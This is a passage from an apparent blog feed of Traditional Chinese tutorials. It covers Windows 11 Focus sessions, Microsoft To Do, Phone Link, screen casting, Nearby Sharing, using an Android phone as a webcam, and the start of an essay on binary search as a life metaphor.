的內建功能，使用起來無需額外安裝第三方軟體，操作簡單且安全，非常適合需要快速幫助的人。</p>]]></content>
      
      
      <categories>
          
          <category> Windows11 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows11 </tag>
            
            <tag> 2024ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 11 專注功能 X ToDo 任務管理</title>
      <link href="/2024/11/21/windows11/windows11-focus/"/>
      <url>/2024/11/21/windows11/windows11-focus/</url>
      
        <content type="html"><![CDATA[<p>在忙碌的工作環境中，如何保持專注並提高工作效率，往往是成功的關鍵。Windows 11 內建的<strong>專注功能</strong>就是為了幫助您在這些環境中更有效率地工作，並降低外部干擾。這項功能融合了計時器，讓您輕鬆運用番茄工作法，保持工作與休息的良好節奏。接下來，我們將一起了解如何充分利用這個功能提升工作效率。</p><p>Windows 11 的專注功能是一個強大且實用的工具，幫助用戶在忙碌的工作日中保持高效，減少外界的干擾，提升工作質量。不論您是依賴番茄工作法進行任務分配，還是希望在專注期間播放音樂來激勵自己，專注功能都能為您提供完美的解決方案。趕快試試看，讓專注功能助您事半功倍，提升工作效率！</p><h2 id="如何啟動專注功能"><a href="#如何啟動專注功能" class="headerlink" title="如何啟動專注功能"></a>如何啟動專注功能</h2><p>在專注啟動開始計時後，「請勿打擾」功能將自動啟用並靜音所有通知，讓您不再被干擾。如果您偶爾需要檢查通知，還可以輕鬆進入通知中心。專注功能的啟動非常簡單，有多種方法可以讓您輕鬆開始：</p><ol><li>從通知中心啟動：</li></ol><ul><li>點擊工作列中的通知中心。</li><li>選擇專注的持續時間。</li><li>點擊「專注」，開始專注！</li></ul><ol start="2"><li>從設定：</li></ol><ul><li>點擊「開始」&gt;「設定」&gt;「系統」&gt;「專注」。</li><li>點擊「開始專注」即可啟動。 3.從時鐘應用程式：</li><li>點擊「開始」&gt;「所有應用程式」&gt;「時鐘」。</li><li>在時鐘應用中選擇「開始專注」並設置專注時間。</li></ul><p>這三種方式都能快速啟動專注功能，您可以根據自己的習慣選擇最適合的方法。</p><h3 id="設定通知顯示規則"><a href="#設定通知顯示規則" class="headerlink" title="設定通知顯示規則"></a>設定通知顯示規則</h3><p>若想要進一步個人化您的專注體驗，您可以設定通知顯示規則，從而避免不必要的干擾：</p><ol><li>前往「開始」&gt;「設定」&gt;「系統」&gt;「通知」。</li><li>在「請勿打擾」選項中，您可以選擇<ul><li>自動關閉工作時間以外的通知。</li><li>設定優先通知，確保重要提醒不會錯過。</li><li>與其他應用程式搭配使用專注，增強工作效率。</li></ul></li></ol><p>這樣，當您啟動專注模式時，只有優先級最高的通知會進來，其他的訊息則會被靜音或延後，幫助您不被打斷，保持專注。</p><h2 id="專注功能如何運作"><a href="#專注功能如何運作" class="headerlink" title="專注功能如何運作"></a>專注功能如何運作</h2><p>啟動專注功能後，您的螢幕會顯示計時器，並且會自動啟用「請勿打擾」模式。這意味著所有工作列中的應用程式通知都將被靜音，讓您可以全身心投入當前任務。當專注時間結束時，您會收到一個通知，並可以選擇是否提前結束專注或繼續進行專注。</p><p>此外，專注模式還融合了 Microsoft To Do 任務清單和 Spotify 音樂播放器，為您提供更為便捷的工作體驗：</p><ul><li>To Do 任務清單：讓您能夠輕鬆查看待辦事項，隨時追蹤任務進度，保持工作有條不紊。</li><li>Spotify 音樂：通過與 Spotify 的整合，您可以在專注模式下播放喜愛的音樂，為工作增添靈感和動力。</li></ul><p><img src="https://ithelp.ithome.com.tw/upload/images/20241024/20130026znq2uFwWi7.png" alt="https://ithelp.ithome.com.tw/upload/images/20241024/20130026znq2uFwWi7.png"></p><h3 id="如何連結-Spotify-帳戶"><a href="#如何連結-Spotify-帳戶" class="headerlink" title="如何連結 Spotify 帳戶"></a>如何連結 Spotify 帳戶</h3><p>若您希望在專注期間播放音樂，只需按照以下步驟將您的 Spotify 帳戶與時鐘應用程式連結：</p><ul><li>點擊「開始」&gt;「所有應用程式」&gt;「時鐘」。</li><li>在「時鐘」應用中選擇「連結您的 Spotify」，並登入帳戶。</li><li>選擇您想要播放的音樂清單，當計時開始後，音樂會自動播放，為您的工作增添動力。</li></ul><p><img src="https://ithelp.ithome.com.tw/upload/images/20241024/20130026PoogKMDO78.png" alt="https://ithelp.ithome.com.tw/upload/images/20241024/20130026PoogKMDO78.png"></p><h2 id="個人化您的專注體驗"><a href="#個人化您的專注體驗" class="headerlink" title="個人化您的專注體驗"></a>個人化您的專注體驗</h2><p>若您希望根據自己的需求進一步調整專注設置，可以進入設定進行個人化設定：</p><ul><li>前往「開始」 &gt; 「設定」 &gt; 「系統」 &gt; 「專注」。</li><li>在此，您可以選擇哪些設置將應用於未來的專注模式，從而創造一個專屬於自己的高效工作環境。</li></ul><p>另外，別忘了從 Microsoft Store 下載時鐘和 Microsoft To Do，這樣才能充分發揮專注的各項強大功能。</p><p>內建的 Microsoft To Do 成為了日常任務管理的得力助手，無論是在繁忙的工作中還是管理日常生活，這款應用都能幫助你輕鬆掌控待辦事項，提升工作效率。今天，我們將帶你深入了解 Microsoft To Do 的強大功能，幫助你更好地管理時間和任務。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241023/20130026VCrqUsfgtA.png" alt="https://ithelp.ithome.com.tw/upload/images/20241023/20130026VCrqUsfgtA.png"></p><p>無論你是單純需要管理日常生活中的待辦事項，還是需要在工作中協作、管理多個任務，Microsoft To Do 都能提供一站式解決方案。簡單的界面、多樣化的功能以及與 Outlook、Windows 系統的緊密集成，使得這款應用在工作和生活中都能大大提升效率。如果你還沒有使用它，現在就是嘗試的最佳時機！</p><h2 id="我的一天：聚焦當日任務，提升專注力"><a href="#我的一天：聚焦當日任務，提升專注力" class="headerlink" title="我的一天：聚焦當日任務，提升專注力"></a>我的一天：聚焦當日任務，提升專注力</h2><p>「我的一天」是 Microsoft To Do 中的一個重要功能，它每日會自動更新並給出個性化的建議，幫助你專注於當天最重要的任務。你可以從待辦事項清單中選擇今天需要完成的工作，並根據需要隨時調整和更新。</p><blockquote><p>如何幫助你：這一功能讓你每天一開始就能有條理地設定好當日任務，避免忘記或拖延，讓每一天的工作和生活更有條理，專注於最需要完成的事項。</p></blockquote><p><img src="https://ithelp.ithome.com.tw/upload/images/20241023/20130026FRMKcB7lU9.png" alt="https://ithelp.ithome.com.tw/upload/images/20241023/20130026FRMKcB7lU9.png"></p><h2 id="重要任務：讓優先級任務更加顯眼"><a href="#重要任務：讓優先級任務更加顯眼" class="headerlink" title="重要任務：讓優先級任務更加顯眼"></a>重要任務：讓優先級任務更加顯眼</h2><p>有些任務可能比其他任務更為緊急或重要。透過「重要任務」功能，你可以為特定的任務加星標，並將這些任務集中顯示在專門的列表中。</p><blockquote><p>如何幫助你：這樣你可以一目瞭然地看到哪些是最重要的任務，並確保這些高優先級的工作不會被忽略。此外，若你在輸入任務時設置了日期和時間，Microsoft To Do 會自動為你提供提醒，確保任務按時完成，特別適合需要多任務管理的用戶。</p></blockquote><p><img src="https://ithelp.ithome.com.tw/upload/images/20241023/20130026ZY8EQj9DiX.png" alt="https://ithelp.ithome.com.tw/upload/images/20241023/20130026ZY8EQj9DiX.png"></p><h2 id="計劃：合理安排時間，減少工作壓力"><a href="#計劃：合理安排時間，減少工作壓力" class="headerlink" title="計劃：合理安排時間，減少工作壓力"></a>計劃：合理安排時間，減少工作壓力</h2><p>Microsoft To Do 的「計劃」功能允許你為每個任務設定截止日期或提醒，這是有效時間管理的核心。你可以將工作分解為更小的步驟，並設定每個步驟的完成時間，確保任務不會因臨近截止日期而積壓。</p><blockquote><p>如何幫助你：所有已設置日期或提醒的任務會自動顯示在計劃列表中，幫助你提前做好準備，避免因為未提前規劃而造成不必要的壓力。這樣你就能有條不紊地推進每個工作項目，並確保自己不會落後。</p></blockquote><h2 id="指派給我：高效管理被指派的任務"><a href="#指派給我：高效管理被指派的任務" class="headerlink" title="指派給我：高效管理被指派的任務"></a>指派給我：高效管理被指派的任務</h2><p>如果你是團隊合作的一員，經常會有一些任務是專門指派給你的。在 Microsoft To Do 中，「指派給我」功能可以幫助你輕鬆查看所有被指派的任務，讓你不會因為信息過多而錯過任何關鍵事項。</p><blockquote><p>如何幫助你：這樣你就能清楚地知道哪些任務是你的責任，從而更專注地跟進，確保每個任務都能按時完成。</p></blockquote><h2 id="標記郵件：將電子郵件轉化為待辦任務"><a href="#標記郵件：將電子郵件轉化為待辦任務" class="headerlink" title="標記郵件：將電子郵件轉化為待辦任務"></a>標記郵件：將電子郵件轉化為待辦任務</h2><p>Microsoft To Do 與 Outlook 完美整合，通過「標記郵件」功能，你可以將已標記的電子郵件轉化為任務。這樣，如果有重要的郵件需要回覆或處理，你可以直接將其變成待辦事項，避免漏掉任何重要訊息。</p><blockquote><p>如何幫助你：這樣一來，你不僅能更高效地管理郵件，還能在同一平台中跟蹤和管理所有的工作任務，無論是郵件還是其他待辦事項，都能一目瞭然地進行管理。</p></blockquote><h2 id="任務：無縫管理日常任務"><a href="#任務：無縫管理日常任務" class="headerlink" title="任務：無縫管理日常任務"></a>任務：無縫管理日常任務</h2><p>Microsoft To Do 中的「任務」部分會顯示所有未歸類的任務，讓你可以隨時查看當前需要處理的工作。</p><blockquote><p>如何幫助你：這個功能讓你能夠快速識別當前未處理的事項，無論是緊急的突發任務還是日常的小事，都能即時添加並安排處理。</p></blockquote><h2 id="輕鬆分享與協作"><a href="#輕鬆分享與協作" class="headerlink" title="輕鬆分享與協作"></a>輕鬆分享與協作</h2><p>Microsoft To Do 還支持線上共用待辦事項清單，這讓你可以與同事、朋友或家人共享任務清單，協同完成工作。</p><blockquote><p>如何幫助你：無論是工作中的團隊協作，還是家庭生活中的共享任務，都能輕鬆同步並協同進行。更重要的是，這些清單支持在多平台間同步，無論你使用的是 Windows、iPhone 還是 Android，都能無縫切換，隨時掌控進度。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Windows11 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows11 </tag>
            
            <tag> 2024ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手機連結 X 螢幕投影、檔案分享、Android 手機網路攝影機</title>
      <link href="/2024/11/19/windows11/windows11-phone-link/"/>
      <url>/2024/11/19/windows11/windows11-phone-link/</url>
      
        <content type="html"><![CDATA[<p>在數位化的今天，跨設備協作變得越來越重要，而 Windows 11 的 Phone Link 功能正是為了實現這一目標而誕生的。</p><p>Windows 11 的 Nearby Sharing 功能大大提升了設備間的檔案分享體驗，輕鬆與鄰近裝置分享檔案，無論是與其他 Windows 裝置還是支援此功能的 Android 裝置進行檔案傳輸，都變得更加簡單、直觀。</p><h2 id="Phone-Link：手機與-Windows-11-的完美融合"><a href="#Phone-Link：手機與-Windows-11-的完美融合" class="headerlink" title="Phone Link：手機與 Windows 11 的完美融合"></a>Phone Link：手機與 Windows 11 的完美融合</h2><p>隨著手機成為我們生活中無處不在的工具，如何讓手機和電腦更好地協同工作成為了一個重要課題。Windows 11 的 Phone Link 功能正是為了解決這一需求而誕生的，它讓使用者可以在桌面上直接控制手機，實現更加順暢的跨設備操作。從直接運行手機應用、同步通知、瀏覽照片，到撥打電話、查看簡訊和音樂播放，這些功能無縫地整合進了 Windows 11 系統中，讓設備之間的界限變得越來越模糊。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241019/20130026Utv8DU5FXO.png" alt="https://ithelp.ithome.com.tw/upload/images/20241019/20130026Utv8DU5FXO.png"></p><h3 id="直接在-Windows-11-上使用手機-APP"><a href="#直接在-Windows-11-上使用手機-APP" class="headerlink" title="直接在 Windows 11 上使用手機 APP"></a>直接在 Windows 11 上使用手機 APP</h3><p>Windows 11 提供了一個強大的功能，讓使用者能夠在桌面上直接運行 Android 應用程式。這項功能是透過 Microsoft Store 和 Amazon Appstore 整合實現的。用戶可以輕鬆下載並安裝如 Spotify、Netflix、WhatsApp 等流行應用，直接在 Windows 11 上使用，無需再切換到手機上操作。</p><p>這樣的設計不僅提高了工作效率，還能讓用戶在大螢幕上更方便地操作手機應用。例如，您可以在辦公時直接查看 TikTok，或是快速瀏覽手機上的社交媒體，無需停下手頭工作拿起手機。</p><h3 id="同步通知：即時掌握重要訊息"><a href="#同步通知：即時掌握重要訊息" class="headerlink" title="同步通知：即時掌握重要訊息"></a>同步通知：即時掌握重要訊息</h3><p>Windows 11 支援手機通知的同步功能，這讓您在工作時也不會錯過重要訊息。無論是來自 WhatsApp、Facebook、Line，還是短信、郵件，所有通知都會即時顯示在電腦螢幕上。這對於需要頻繁處理工作訊息的用戶來說，無疑是提升效率的好幫手。</p><p>例如，當您正在處理文件時，收到一條 Line 或是 IG 訊息，可以直接在電腦上查看和回覆，避免了來回切換設備的麻煩。</p><h3 id="瀏覽照片：無縫管理相簿"><a href="#瀏覽照片：無縫管理相簿" class="headerlink" title="瀏覽照片：無縫管理相簿"></a>瀏覽照片：無縫管理相簿</h3><p>不再需要手動傳輸照片，Windows 11 讓您能夠直接在電腦上瀏覽手機中的相簿，快速查看、編輯或分享照片。這對於經常拍照的使用者來說，極大地簡化了管理照片的流程。無論是工作報告中的圖片，還是日常生活中的珍貴回憶，您都可以輕鬆地在大螢幕上進行查看和編輯。</p><h3 id="瀏覽通話紀錄並透過電腦撥號"><a href="#瀏覽通話紀錄並透過電腦撥號" class="headerlink" title="瀏覽通話紀錄並透過電腦撥號"></a>瀏覽通話紀錄並透過電腦撥號</h3><p>Windows 11 不僅支持查看手機中的通話紀錄，還能直接在電腦上撥打電話。用戶可以輕鬆查看最近的通話紀錄，並只需點擊聯絡人名稱，即可通過電腦撥打電話。這對於專業人士來說非常實用，尤其是需要頻繁聯絡同事或客戶的時候，可以顯著提高通話效率，免去拿起手機的麻煩。</p><h3 id="查看簡訊：即時聯絡無障礙"><a href="#查看簡訊：即時聯絡無障礙" class="headerlink" title="查看簡訊：即時聯絡無障礙"></a>查看簡訊：即時聯絡無障礙</h3><p>Windows 11 允許用戶在電腦上直接查看手機簡訊，並且可以快速回覆。這樣的功能避免了錯過重要訊息的情況，特別是當您在處理工作時，無需頻繁檢查手機。用戶可以在大螢幕上輕鬆地回覆簡訊，讓溝通變得更加便捷。</p><h3 id="尋找手機：快速定位手機"><a href="#尋找手機：快速定位手機" class="headerlink" title="尋找手機：快速定位手機"></a>尋找手機：快速定位手機</h3><p>手機不見了？Windows 11 內建的尋找手機功能可以幫助您輕鬆定位手機。當手機被放在某個地方找不到時，用戶只需透過電腦發送信號，讓手機發出聲音或震動，幫助快速找回手機。這一功能不僅實用，而且在忙碌的工作日常中能大大節省時間。</p><h3 id="藍牙音樂撥放：享受高品質音效"><a href="#藍牙音樂撥放：享受高品質音效" class="headerlink" title="藍牙音樂撥放：享受高品質音效"></a>藍牙音樂撥放：享受高品質音效</h3><p>Windows 11 支援藍牙音樂播放，讓您可以無線將手機中的音樂播放到電腦上。這樣，即使您正在使用電腦工作，也能輕鬆享受來自手機的音樂。只需簡單的藍牙配對，您便可以在工作或休閒時隨時聽到喜愛的音樂，享受高品質音效。</p><h2 id="Windows-11-「投影」-與-「接受投影」"><a href="#Windows-11-「投影」-與-「接受投影」" class="headerlink" title="Windows 11 「投影」 與 「接受投影」"></a>Windows 11 「投影」 與 「接受投影」</h2><p>Windows 11 引入了全新的 「投影」 與 「接受投影」 功能，這些功能讓不同設備之間的連接與共享變得更簡單、更靈活。無論是在家庭娛樂、辦公室簡報還是教育環境中，這些功能都為用戶提供了更多的選擇與便捷的操作方式。</p><h3 id="Windows-11-投影到其他螢幕"><a href="#Windows-11-投影到其他螢幕" class="headerlink" title="Windows 11 投影到其他螢幕"></a>Windows 11 投影到其他螢幕</h3><p>如果你想在家看電腦的影片或是進行簡報，透過投影到電視的功能就可以快速的投放上去，你當然也可以選擇投影到另外一台電腦但另外一台電腦需開啟「投影到這台電腦」功能。</p><p>Windows 11 使得投影至其他螢幕變得更輕鬆。無論是投影到電視、外接顯示器，還是其他支持投影的設備，只需簡單幾步就可以完成。以下是三種投影的開啟方式：</p><ol><li>快捷鍵: Windows + K：按下 Windows + K 可以快速打開「連接」界面，讓你尋找可用的投影設備，像是電視、投影儀或其他設備。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241029/20130026lcrdlBrC3v.png" alt="https://ithelp.ithome.com.tw/upload/images/20241029/20130026lcrdlBrC3v.png"></p><ol start="2"><li>右下角快速設定: 在任務欄右下角的快速設定中，如果沒有可以投影的設備，點擊 鉛筆圖示 後選擇「新增」，就能加入新設備進行投影。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241029/20130026tWieZqvpJC.png" alt="https://ithelp.ithome.com.tw/upload/images/20241029/20130026tWieZqvpJC.png"></p><ol start="3"><li>搜尋 cast: 你可以透過搜尋「cast」來快速進入「設定」&gt;「顯示」&gt;「無線顯示設備」來啟動投影。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241029/2013002621DgL5jGrr.png" alt="https://ithelp.ithome.com.tw/upload/images/20241029/2013002621DgL5jGrr.png"></p><p>此外，你還可以利用 Windows + P 來選擇投影模式，提供以下選項：</p><ul><li>只顯示桌面</li><li>複製</li><li>延伸</li><li>只顯示第二個螢幕</li></ul><p>這些模式能幫助你更靈活地選擇顯示方式，提升工作與娛樂效率。</p><p>常見問題：</p><ul><li>確保所有設備都連接至同一 Wi-Fi 網路，才能正常使用投影功能。</li><li>更新顯示驅動程式，以避免任何連接問題。</li><li>根據需要調整解析度，確保最佳顯示效果。</li></ul><h3 id="Windows-11-接受其他設備的投影"><a href="#Windows-11-接受其他設備的投影" class="headerlink" title="Windows 11 接受其他設備的投影"></a>Windows 11 接受其他設備的投影</h3><p>Windows 11 也支持接受投影，如果你是手機 APP 的講師更可以透過將手機螢幕投影到電腦的功能進行 APP 的操作教學，電腦則可以選擇用線輸出到投影機或是電視，這對於教學、展示等場景尤其有用。</p><p>設定的方式如下:</p><ol><li>進入「設定」&gt;「系統」&gt;「Optional Features」，並加入 Wireless Display（無線顯示）功能。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241031/20130026CNz9Cy65Lp.png" alt="https://ithelp.ithome.com.tw/upload/images/20241031/20130026CNz9Cy65Lp.png"></p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241031/20130026gsi5U3PewC.png" alt="https://ithelp.ithome.com.tw/upload/images/20241031/20130026gsi5U3PewC.png"></p><ol start="2"><li>確認啟用接受投影功能：在「設定」中找到「投影到這台電腦」，並確保此功能已啟用。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241029/20130026oGCfSOGR3k.png" alt="https://ithelp.ithome.com.tw/upload/images/20241029/20130026oGCfSOGR3k.png"></p><ol start="3"><li>準備接受投影：當其他設備開啟投影時，你的電腦會自動顯示，確認接受投影即可。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241029/20130026MTg4BKjMgn.png" alt="https://ithelp.ithome.com.tw/upload/images/20241029/20130026MTg4BKjMgn.png"></p><ol start="4"><li>Wireless Display 也提供了專門的介面來等待接收投影，這樣你可以在不同設備之間輕鬆切換。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241031/20130026gQWCQ3FCk3.png" alt="https://ithelp.ithome.com.tw/upload/images/20241031/20130026gQWCQ3FCk3.png"></p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241031/20130026hCkDBig6gI.png" alt="https://ithelp.ithome.com.tw/upload/images/20241031/20130026hCkDBig6gI.png"></p><p>這樣一來，你的電腦就能成為其他設備的接收端，進行各種操作或展示，無論是教學、簡報或是展示手機上的應用。</p><p>Windows 11 的「投影」與「接受投影」功能大大提升了設備間的互動性和連接性，無論是在家庭娛樂、商務會議還是教學場景中，都能提供更多靈活的選擇和高效的使用體驗。現在，你可以輕鬆地將電腦或其他設備的畫面投影到大螢幕上，或者接受其他設備的投影，這些功能讓工作和娛樂都更加便捷。</p><h2 id="使用「Nearby-Sharing」檔案分享"><a href="#使用「Nearby-Sharing」檔案分享" class="headerlink" title="使用「Nearby Sharing」檔案分享"></a>使用「Nearby Sharing」檔案分享</h2><p>Nearby Sharing（鄰近分享）是 Windows 11 的一項強大功能，讓你可以在同一 Wi-Fi 網絡或藍牙範圍內，輕鬆分享檔案與其他 Windows 裝置，甚至與支援這項功能的 Android 手機進行共享。</p><p>開啟 Nearby Sharing 功能：</p><ol><li>前往 設定 &gt; 系統 &gt; 共享，並啟用 Nearby Sharing。</li><li>在此頁面中，你還可以選擇接收檔案的裝置範圍，包括所有裝置或僅限設備上的其他 Windows 裝置。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241030/2013002680C3Um991A.png" alt="https://ithelp.ithome.com.tw/upload/images/20241030/2013002680C3Um991A.png"></p><p>分享檔案：</p><ol><li>在 Windows 11 中，選擇你要分享的檔案（無論是圖片、文件或其他檔案類型）。</li><li>點擊<strong>分享</strong>按鈕，會開啟一個選單，顯示所有可以接收檔案的裝置。</li><li>選擇你想要分享的設備，接收端會收到分享請求。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241030/20130026UDgGMzgtfj.png" alt="https://ithelp.ithome.com.tw/upload/images/20241030/20130026UDgGMzgtfj.png"></p><p>接收檔案：當你的裝置收到分享請求時，會顯示出來。你只需接受該請求，檔案就會自動下載到你的裝置。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241030/20130026FrrYYMrHkT.png" alt="https://ithelp.ithome.com.tw/upload/images/20241030/20130026FrrYYMrHkT.png"></p><p>這項功能使得檔案分享變得像行動裝置一樣簡單，無需插入 USB 或進行複雜設定，輕鬆實現設備間的互動。</p><h3 id="使用第三方應用程式與鄰近裝置分享檔案"><a href="#使用第三方應用程式與鄰近裝置分享檔案" class="headerlink" title="使用第三方應用程式與鄰近裝置分享檔案"></a>使用第三方應用程式與鄰近裝置分享檔案</h3><p>除了 Windows 11 內建的 Nearby Sharing，你還可以使用一些流行的第三方應用程式來進行檔案共享，這些應用程式提供了跨平台的分享功能，無論是在不同的作業系統間分享檔案，還是進行 Wi-Fi 直接傳輸，都非常便利。</p><ol><li><p>ShareIt: 是一款受歡迎的跨平台檔案分享應用，支持 Windows、Android 和 iOS 系統之間的檔案傳輸。這款應用的最大優勢是速度非常快，並且能夠在沒有網際網路的情況下，通過 Wi-Fi 熱點進行檔案分享。</p></li><li><p>Feem: 允許使用者在本地 Wi-Fi 網絡下直接分享檔案，無需依賴網際網路連接。Feem 提供了快速的檔案傳輸速度，並支持跨平台操作，包括 Windows、macOS 和 Android 等系統。</p></li><li><p>Snapdrop: 是一個基於瀏覽器的檔案分享工具，類似於 Apple 的 AirDrop 功能。只需在兩個裝置上打開 Snapdrop 網頁，就可以在不需要安裝任何應用程式的情況下，直接進行檔案傳輸。這對於那些不想安裝額外應用程式的使用者非常方便。</p></li></ol><p>Snapdrop 網頁: <a href="https://snapdrop.net/">https://snapdrop.net/</a></p><h2 id="Android-手機就是-Windows-11-的網路攝影機"><a href="#Android-手機就是-Windows-11-的網路攝影機" class="headerlink" title="Android 手機就是 Windows 11 的網路攝影機"></a>Android 手機就是 Windows 11 的網路攝影機</h2><p>在 Windows 11 的最新更新中，微軟推出了一項令人興奮的新功能，使用者可以將 Android 手機或平板的攝影機用作 PC 的網路攝影機。</p><p>這一功能目前已開放，無論是誰都能輕鬆享受高畫質的視訊通話體驗，透過將 Android 手機轉變為網路攝影機，Windows 11 不僅增強了多裝置的連結性，也提供了一個更靈活、經濟的選擇，讓用戶能夠在需要時隨時開啟高品質的視訊通話。隨著技術的進步，未來我們期待看到更多功能的整合與提升！</p><h3 id="無縫連接與簡易設置"><a href="#無縫連接與簡易設置" class="headerlink" title="無縫連接與簡易設置"></a>無縫連接與簡易設置</h3><p>要使用這項功能，用戶需確保其 Android 裝置運行 Android 9.0 以上系統，並安裝版本 1.24012 或更高版本的「連結至 Windows」應用程式。</p><p>設定步驟：</p><ol><li>在 Windows 11 中，進入 設定 &gt; 藍牙與裝置 &gt; 行動裝置。</li><li>選擇<strong>管理裝置</strong>，然後啟用<strong>裝置及附帶啟用的控制功能</strong>。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241103/20130026Pvv3AG40G9.png" alt="https://ithelp.ithome.com.tw/upload/images/20241103/20130026Pvv3AG40G9.png"></p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241103/20130026KnBs9jm4Zg.png" alt="https://ithelp.ithome.com.tw/upload/images/20241103/20130026KnBs9jm4Zg.png"></p><ol start="3"><li>啟用後，系統會自動顯示「Windows 虛擬攝影機」，並將你的手機攝影機作為可選的視訊來源。在任何視訊應用程式中，你都可以選擇使用你的手機來進行視訊通話或錄製。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241103/20130026oo4t3oFGdl.png" alt="https://ithelp.ithome.com.tw/upload/images/20241103/20130026oo4t3oFGdl.png"></p><ol start="4"><li>這樣，你就能輕鬆將手機轉變為高品質的網路攝影機，並提高視訊通話的品質。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241103/201300262EnBZQevxK.png" alt="https://ithelp.ithome.com.tw/upload/images/20241103/201300262EnBZQevxK.png"></p><h3 id="多功能攝影機控制"><a href="#多功能攝影機控制" class="headerlink" title="多功能攝影機控制"></a>多功能攝影機控制</h3><p>除了基本的影像流控制，這項功能還支持一些便捷的攝影機管理選項：</p><ul><li>前後攝影機切換：使用者可以隨時在手機的前置和後置攝影機之間切換，這對於不同場景下的使用非常有幫助。</li><li>暫停影像串流：當你不需要使用攝影機時，可以隨時暫停影像的串流，節省資源或避免不必要的視訊暴露。</li></ul><p><img src="https://ithelp.ithome.com.tw/upload/images/20241103/20130026Um0Ir2nqko.png" alt="https://ithelp.ithome.com.tw/upload/images/20241103/20130026Um0Ir2nqko.png"></p><p>這些功能不僅可以通過 PC 上的 Windows 虛擬攝影機 控制，也可以通過手機上的 「連結至 Windows」 應用進行管理。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241103/201300260uBe1IPuHZ.png" alt="https://ithelp.ithome.com.tw/upload/images/20241103/201300260uBe1IPuHZ.png"></p><p>注意：手機必須保持解鎖狀態，才能正常啟動和使用攝影機。</p><h3 id="為何選擇手機作為網路攝影機？"><a href="#為何選擇手機作為網路攝影機？" class="headerlink" title="為何選擇手機作為網路攝影機？"></a>為何選擇手機作為網路攝影機？</h3><p>這項功能特別適合那些沒有專業網路攝影機的用戶，或者是對於不想額外花費購買高級攝影機的用戶。許多用戶可以將手邊的 Android 手機或平板作為高品質的網路攝影機，輕鬆進行視訊通話、線上會議、直播等。</p><p>雖然目前這項功能僅支持視訊影像傳輸，不包括音訊（音訊仍需通過其他方式，如藍牙耳機或內建麥克風），但這項新技術無疑為居家辦公、線上學習和遠程交流帶來了很大的便利。</p><h2 id="Windows-11-手機與電腦的無縫體驗"><a href="#Windows-11-手機與電腦的無縫體驗" class="headerlink" title="Windows 11 手機與電腦的無縫體驗"></a>Windows 11 手機與電腦的無縫體驗</h2><p>Windows 11 的 Phone Link 功能顯示了微軟在跨平台體驗上的積極創新。這項功能的推出讓手機與電腦之間的協作變得更加無縫，極大地提升了工作和生活的效率。</p><p>隨著未來功能的進一步發展，Windows 11 將繼續推動不同設備間的互聯互通，開啟更多的可能性。無論是在辦公室還是日常生活中，Phone Link 使得我們的數位生活更加便捷、流暢，未來的科技體驗也將變得更加智慧和人性化。</p><p>隨著 Windows 11 持續更新和改進，這項功能也有可能在未來得到更多優化。例如，未來或許會支持音訊傳輸，或者提供更多的影像處理選項，如自動對焦、背景虛化等，進一步提升視訊通話的品質和體驗。</p><p>Windows 11 讓 Android 手機成為高效能的網路攝影機，這不僅提升了多裝置之間的連接性，也讓用戶無需額外投資即可享受高清視訊通話或直播。無論是用於居家辦公、線上學習，還是其他需要視訊交流的場合，這項功能都能提供一個經濟、方便的解決方案。</p>]]></content>
      
      
      <categories>
          
          <category> Windows11 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows11 </tag>
            
            <tag> 2024ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人生的二分搜尋法</title>
      <link href="/2024/10/27/life-thinking-algorithm/binary-search-in-life/"/>
      <url>/2024/10/27/life-thinking-algorithm/binary-search-in-life/</url>
      
        <content type="html"><![CDATA[<p>想像一下我們參加了一場比賽，你需要在沙灘上透過唯一的選擇找到最大最喜歡的貝殼，規則是只能做一次選擇撿貝殼，且過程中不能更換，起點、終點、比賽時間會是固定的。</p><p>在沙灘上撿貝殼，就好像我們在做人生的終極二選一，都只是單純要或不要的決定，唯一的限制和規則是時間固定的流逝，而我們只能不斷的決定。</p><p>接下來我們就用演算法的角度來看看為什麼演唱會總是聽一場少一場?</p><h2 id="二分搜尋法"><a href="#二分搜尋法" class="headerlink" title="二分搜尋法"></a>二分搜尋法</h2><p>終極二選一中，有一個比較可以類比的是二分搜尋法，但通常用於在有序列表中快速找到目標元素，二分搜尋法的優勢在於每次都能把查找的範圍減半，所以即使資料量很大，它也能很快找到結果。這就像你每次都能跳過一半的書頁來尋找，節省了很多時間。</p><p>想像你有一本厚厚的書，裡面有很多頁，而每頁上都有不同的內容。如果你要找某一頁，但不想一頁一頁地翻，那麼你就可以用二分搜尋法來快速找到目標。</p><ol><li>確保已排序：首先，這本書的內容必須是有順序的，比如按字母或數字排列。</li><li>設定範圍：設置兩個指標，叫做 low 和 